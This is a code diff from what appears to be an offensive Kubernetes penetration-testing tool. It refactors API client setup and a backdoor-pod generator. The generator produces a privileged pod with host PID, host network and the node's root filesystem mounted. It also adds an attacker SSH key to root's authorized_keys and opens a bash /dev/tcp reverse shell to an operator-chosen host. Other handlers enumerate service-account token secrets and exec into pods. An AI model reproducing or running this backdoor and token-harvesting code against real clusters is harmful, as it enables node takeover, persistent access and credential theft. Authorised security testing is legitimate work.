@@ -10,16 +10,13 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
+	corev1 "k8s.io/api/core/v1"
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"sigs.k8s.io/yaml"
 )
 
-func buildK8sClient(server, token, username, password string, skipTLS bool) (*kubectl.Client, error) {
-	if token != "" {
-		return kubectl.NewClient(server, token, skipTLS)
-	}
-	if username != "" {
-		return kubectl.NewClientWithUserPass(server, username, password, skipTLS)
-	}
-	return kubectl.NewClient(server, "", skipTLS)
+func buildK8sClient(targetHost, token, username, password string, skipTLS bool) (*kubectl.Client, error) {
+	return kubectl.NewTargetClient(targetHost, token, username, password, skipTLS)
 }
 
 type ExecHandler struct{}
@@ -45,8 +42,7 @@ func (h *ExecHandler) APIListPods(c *gin.Context) {
 		req.TimeoutSec = 10
 	}
 
-	server := "https://" + req.TargetHost + ":6443"
-	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
+	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
 		return
@@ -101,8 +97,7 @@ func (h *ExecHandler) APIExecInPod(c *gin.Context) {
 		req.TimeoutSec = 10
 	}
 
-	server := "https://" + req.TargetHost + ":6443"
-	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
+	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
 		return
@@ -138,9 +133,9 @@ func (h *ExecHandler) EnumSATokens(c *gin.Context) {
 		req.TimeoutSec = 10
 	}
 
-	url := fmt.Sprintf("https://%s:6443/api/v1/secrets", req.TargetHost)
+	url := kubectl.APIServerURL(req.TargetHost) + "/api/v1/secrets"
 	if req.Namespace != "" {
-		url = fmt.Sprintf("https://%s:6443/api/v1/namespaces/%s/secrets", req.TargetHost, req.Namespace)
+		url = fmt.Sprintf("%s/api/v1/namespaces/%s/secrets", kubectl.APIServerURL(req.TargetHost), req.Namespace)
 	}
 	// Add fieldSelector for SA tokens
 	url += "?fieldSelector=type=kubernetes.io/service-account-token"
@@ -212,6 +207,7 @@ func (h *ExecHandler) KubeletExec(c *gin.Context) {
 
 // Backdoor Pod
 type BackdoorConfig struct {
+	Namespace string `json:"namespace"`
 	Image     string `json:"image"`
 	MountPath string `json:"mount_path"`
 	NodeName  string `json:"node_name"`
@@ -230,6 +226,9 @@ func (h *ExecHandler) GenerateBackdoorYAML(c *gin.Context) {
 	if req.Image == "" {
 		req.Image = "ubuntu:latest"
 	}
+	if req.Namespace == "" {
+		req.Namespace = "default"
+	}
 	if req.MountPath == "" {
 		req.MountPath = "/mnt"
 	}
@@ -241,45 +240,61 @@ func (h *ExecHandler) GenerateBackdoorYAML(c *gin.Context) {
 }
 
 func generateBackdoorYAML(cfg BackdoorConfig) string {
-	nodeSelector := ""
-	if cfg.NodeName != "" {
-		nodeSelector = fmt.Sprintf("  nodeName: %s\n", cfg.NodeName)
-	}
-	sshCmd := ""
+	setupSteps := make([]string, 0, 3)
 	if cfg.SSHKey != "" {
-		sshCmd = fmt.Sprintf("    mkdir -p /mnt/root/.ssh && echo '%s' >> /mnt/root/.ssh/authorized_keys\n", cfg.SSHKey)
+		setupSteps = append(setupSteps,
+			fmt.Sprintf("mkdir -p %s/root/.ssh", cfg.MountPath),
+			fmt.Sprintf("printf '%%s\\n' '%s' >> %s/root/.ssh/authorized_keys", cfg.SSHKey, cfg.MountPath),
+			fmt.Sprintf("chmod 600 %s/root/.ssh/authorized_keys", cfg.MountPath),
+		)
 	}
-	revShell := ""
 	if cfg.LHost != "" && cfg.LPort != "" {
-		revShell = fmt.Sprintf("    /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &\n", cfg.LHost, cfg.LPort)
+		setupSteps = append(setupSteps, fmt.Sprintf("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &", cfg.LHost, cfg.LPort))
+	}
+	setupSteps = append(setupSteps, "while true; do sleep 3600; done")
+
+	privileged := true
+	hostPathType := corev1.HostPathDirectory
+	pod := &corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      cfg.PodName,
+			Namespace: cfg.Namespace,
+			Labels:    map[string]string{"app": "backdoor"},
+		},
+		Spec: corev1.PodSpec{
+			HostPID:     true,
+			HostNetwork: true,
+			NodeName:    cfg.NodeName,
+			Containers: []corev1.Container{{
+				Name:    "backdoor",
+				Image:   cfg.Image,
+				Command: []string{"/bin/sh"},
+				Args:    []string{"-c", strings.Join(setupSteps, " && ")},
+				SecurityContext: &corev1.SecurityContext{
+					Privileged: &privileged,
+				},
+				VolumeMounts: []corev1.VolumeMount{{
+					Name:      "host-root",
+					MountPath: cfg.MountPath,
+				}},
+			}},
+			Volumes: []corev1.Volume{{
+				Name: "host-root",
+				VolumeSource: corev1.VolumeSource{
+					HostPath: &corev1.HostPathVolumeSource{
+						Path: "/",
+						Type: &hostPathType,
+					},
+				},
+			}},
+		},
 	}
 
-	return fmt.Sprintf(`apiVersion: v1
-kind: Pod
-metadata:
-  name: %s
-  labels:
-    app: backdoor
-spec:
-  hostPID: true
-  hostNetwork: true
-%s
-  containers:
-  - name: backdoor
-    image: %s
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do sleep 3600; done"]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host-root
-      mountPath: %s
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
-      type: Directory
-`, cfg.PodName, nodeSelector, cfg.Image, cfg.MountPath) + sshCmd + revShell
+	body, err := yaml.Marshal(pod)
+	if err != nil {
+		return fmt.Sprintf("marshal backdoor pod yaml: %v", err)
+	}
+	return string(body)
 }
 
 // RBAC
@@ -296,8 +311,7 @@ func (h *ExecHandler) CheckRBAC(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	server := "https://" + req.TargetHost + ":6443"
-	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
+	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
 		return
@@ -399,7 +413,7 @@ func (h *ExecHandler) UploadFile(c *gin.Context) {
 		req.TimeoutSec = 30
 	}
 
-	client, err := buildK8sClient("https://"+req.TargetHost+":6443", req.Token, req.Username, req.Password, req.SkipTLS)
+	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
 		return
